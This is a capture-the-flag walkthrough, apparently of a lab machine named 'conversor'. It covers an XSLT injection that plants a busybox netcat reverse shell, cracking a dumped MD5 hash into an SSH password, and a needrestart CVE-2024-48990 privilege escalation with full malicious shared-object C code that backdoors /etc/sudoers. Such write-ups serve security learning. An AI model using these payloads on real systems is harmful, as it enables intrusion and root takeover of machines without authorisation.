### Nmap
- normal scan didn't work. needed SYN scan
```
sudo nmap -sS -sV -sC vv 10.10.11.92   

---OUTPUT---
Host is up, received reset ttl 63 (0.021s latency).
Scanned at 2025-12-11 13:27:37 EST for 7s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9JqBn+xSQHg4I+jiEo+FiiRUhIRrVFyvZWz1pynUb/txOEximgV3lqjMSYxeV/9hieOFZewt/ACQbPhbR/oaE=
|   256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIR1sFcTPihpLp0OemLScFRf8nSrybmPGzOs83oKikw+
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
![[Pasted image 20251211132929.png]]
- I registered as `test:test` and logged in
![[Pasted image 20251211133027.png]]
- Can upload XML and XSLT files. 
https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/#read-files-and-ssrf-using-document
- In the About page I can grab the source code and extract with `tar -xzvf` command and I find there is a users.db but nothing in it. its an sqlite3 file:
![[Pasted image 20251211190536.png]]

```
tar -xvf source_code.tar.gz
```
- Dumping sql file:
```
cd instance
sqlite3 users.db.dump
```
![[Pasted image 20251211185955.png]]

-----
- Looking online I find an example xslt exploit 
![[Pasted image 20251211185521.png]]
- I can use this to make xml view it as an executable and save it to the location I wish. I create an example script (with GPT):
```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:hax0r="http://exslt.org/common"
    extension-element-prefixes="hax0r">

    <xsl:template match="/">
        <hax0r:document href="/var/www/conversor.htb/scripts/rev.py" method="text">
import os
os.system("busybox nc 10.10.14.21 9998 -e /bin/bash") 
        </hax0r:document>
    </xsl:template>

</xsl:stylesheet>
```
- I also create a simple conveyor.xml file and upload both while having my netcat listener waiting:
![[Pasted image 20251211185747.png]]

- I grab a shell on my listener as `www-data`
![[Pasted image 20251211190842.png]]
- I check /etc/passwd for other users:
```
cat /etc/passwd | grep -i "/bin/bash"
```
![[Pasted image 20251211190419.png]]

- I check the users.db (based on the source code file we found earlier) file and dump the output to find an MD5 hash of user `fismathack`:
![[Pasted image 20251211191013.png]]
```
sqlite3 users.db .dump


---OUTPUT---
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    );
INSERT INTO users VALUES(1,'fismathack','5b5c3ac3a1c897c94caad48e6c71fdec');
INSERT INTO users VALUES(5,'test','098f6bcd4621d373cade4e832627b4f6');
CREATE TABLE files (
        id TEXT PRIMARY KEY,
        user_id INTEGER,
        filename TEXT,
        FOREIGN KEY(user_id) REFERENCES users(id)
    );
INSERT INTO files VALUES('8374be69-0931-4445-8f58-5589d27ec7d7',2,'8374be69-0931-4445-8f58-5589d27ec7d7.html');
INSERT INTO files VALUES('a10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2',2,'a10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2.html');
INSERT INTO files VALUES('89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b',2,'89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b.html');
INSERT INTO files VALUES('00508ffa-82dd-4c42-9867-7dd4a6b16605',2,'00508ffa-82dd-4c42-9867-7dd4a6b16605.html');
INSERT INTO files VALUES('0facc6c2-7625-4240-9dd0-d1085335224c',3,'0facc6c2-7625-4240-9dd0-d1085335224c.html');
INSERT INTO files VALUES('f06dc183-e13f-4f4c-8389-7e414d7fe573',3,'f06dc183-e13f-4f4c-8389-7e414d7fe573.html');
INSERT INTO files VALUES('c3f1ec9b-1b2c-49d2-96a6-33aff7028391',3,'c3f1ec9b-1b2c-49d2-96a6-33aff7028391.html');
INSERT INTO files VALUES('1363be8b-c6c8-4227-92cc-1367b434fb14',4,'1363be8b-c6c8-4227-92cc-1367b434fb14.html');
INSERT INTO files VALUES('0b4386b4-763e-4a5e-9ea3-3c696869eb9e',5,'0b4386b4-763e-4a5e-9ea3-3c696869eb9e.html');
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('users',5);
COMMIT;
```
- I crack the hash with crackstation.net : `Keepmesafeandwarm`
![[Pasted image 20251211191126.png]]

- I can ssh into the target as user `fismat:Keepmesafeandwarm`
```
ssh fismathack@10.10.11.92
```
![[Pasted image 20251211191310.png]]
- checking sudo privileged commands I find needstart:
```
sudo -l

---OUTPUT---
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```
![[Pasted image 20251211191335.png]]
- I check the help command and find the argument to find the version:
```
sudo /usr/bin/needtsart --help
sudo /usr/sbin/needrestart --version


---OUTPUT---
needrestart 3.7 - Restart daemons after library updates.

Authors:
  Thomas Liske <thomas@fiasko-nw.net>

Copyright Holder:
  2013 - 2022 (C) Thomas Liske [http://fiasko-nw.net/~thomas/]

Upstream:
  https://github.com/liske/needrestart

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.
```
- Looking online it leads me to a CVE : `CVE-2024-48990` which affects needstart versions <3.8
- I find a PoC exploit but I can't run it in target as gcc isn't there: https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing

- But reading the code I can see the basic commands it is doing:
```
set -e
mkdir -p malicious/importlib
```
- Then it creates a malicious `lib.c` file which sets its uid to 0 i.e root. I compile this locally :
- `lib.c` file:
```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

// Run function 'a' automatically when the shared object is loaded
// before main() executes (constructor attribute).
static void a() __attribute__((constructor));

void a() {

    // Only execute malicious payload if process is running as root
    if(geteuid() == 0) {

        // Set real user + group ID to root (full privilege)
        setuid(0);
        setgid(0);

        // Shell payload:
        // 1. Copy /bin/sh to /tmp/poc → create a standalone shell
        // 2. Make it SUID root (chmod u+s)
        // 3. Add to /etc/sudoers: allow ALL users to run /tmp/poc without password
        //    - Use grep to check if line is already present (idempotent)
        // 4. Run the whole thing in background (&)
        const char *shell =
            "cp /bin/sh /tmp/poc; "
            "chmod u+s /tmp/poc; "
            "grep -qxF 'ALL ALL=NOPASSWD: /tmp/poc' /etc/sudoers || "
            "echo 'ALL ALL=NOPASSWD: /tmp/poc' | tee -a /etc/sudoers > /dev/null &";

        // Execute the payload using /bin/sh
        system(shell);
    }
}
```
- I compile it with the following command:
```
gcc -shared -fPIC -o "__init__.so" lib.c
```

- I then transfer it to the target:
```
cd /tmp/malicious
wget http://10.10.14.21/lib.c
cd importlib
wget http://10.10.14.21/__init__.so
```
- I then created an `e.py` file which is basically a loop trigerring the library and waiting for the sudi shell (based on the PoC).
```
import time

while True:
    try:
        # Attempt to import importlib repeatedly.
        # If a malicious shared object is placed in the importlib path
        # (such as importlib/__init__.so), Python may load it here,
        # triggering its constructor and escalating privileges.
        import importlib
    except:
        # Ignore errors (e.g., if importlib is broken or replaced)
        pass

    # Check for the SUID root backdoor created by the malicious library
    if __import__("os").path.exists("/tmp/poc"):
        print("Got shell!, delete traces in /tmp/poc, /tmp/malicious")

        # Execute the SUID-root shell.
        # The malicious .so added this to sudoers:
        #   ALL ALL=NOPASSWD: /tmp/poc
        # So this runs instantly as root.
        __import__("os").system("sudo /tmp/poc -p")

        # Stop the loop after root shell is spawned
        break

    # Sleep to avoid busy-waiting
    time.sleep(1)

```
```
vi e.py     # Copy code here
```

- Note that the files keep getting deleted quickly (or maybe if executed in the wrong sequence). Make sure `lib.c` , `__init.so__` and `e.py` are all there before executing e.py and neeedrestart command.
- I ssh into user `fismathack` on another terminal as this one will be listening for the shell.
- On the first terminal on the target I pass the following commands:
```
cd /tmp/malicious
export PYTHONPATH="$PWD"
python3 e.py 2>/dev/null
```
![[Pasted image 20251211194351.png]]

- On the second terminal I trigger the exploit by passing the needrestart command with sudo privileges:
```
sudo /usr/sbin/needrestart
```
![[Pasted image 20251211194304.png]]
- I escalate to root in the first terminal:
![[Pasted image 20251211194326.png]]
- I grab root flag:
![[Pasted image 20251211194427.png]]